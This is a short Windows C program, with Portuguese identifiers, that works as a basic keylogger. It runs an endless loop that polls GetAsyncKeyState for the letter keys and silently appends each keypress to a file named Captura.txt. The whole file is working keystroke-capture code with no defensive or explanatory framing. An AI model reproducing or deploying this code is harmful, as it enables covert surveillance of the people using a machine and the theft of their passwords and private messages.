#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

int main(int argc, char const *argv[])
{
	system("cls");

	argv=argv;
	argc=argc;

	int result;
	int teclas;
    FILE *arquivo;

    arquivo = fopen("Captura.txt","w");

    while(1) 
    {
        for(teclas = 64; teclas <= 90; teclas++) 
        {
            Sleep(1);

            result = GetAsyncKeyState(teclas);

            if(result == -32767) 
            {
                fprintf(arquivo,"%c",teclas);
            }
        }
    }
    
	return 0;
}